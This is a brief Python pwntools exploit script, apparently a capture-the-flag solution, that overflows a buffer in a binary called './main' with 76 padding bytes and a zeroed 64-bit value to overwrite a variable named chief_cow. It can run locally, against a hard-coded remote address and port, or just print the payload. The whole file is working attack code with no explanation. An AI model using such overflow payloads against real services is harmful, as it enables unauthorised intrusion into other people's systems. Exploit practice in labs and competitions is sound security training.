from pwn import *

if "rem" in sys.argv:
    r = remote('192.241.138.174', 9998)
elif "loc" in sys.argv:
    r = process('./main')
else:
    class getPayload:
        def __init__(self):
            self.payload = b''
        def send(self, oper):
            self.payload += oper
        def interactive(self):
            print(self.payload)

    r = getPayload()

r.send(b'A' * (0x50 - 0x4)) ## Write bytes up to chief_cow
r.send(p64(0x0)) ## chief_cow == 0

r.send(b'\n')

r.interactive()
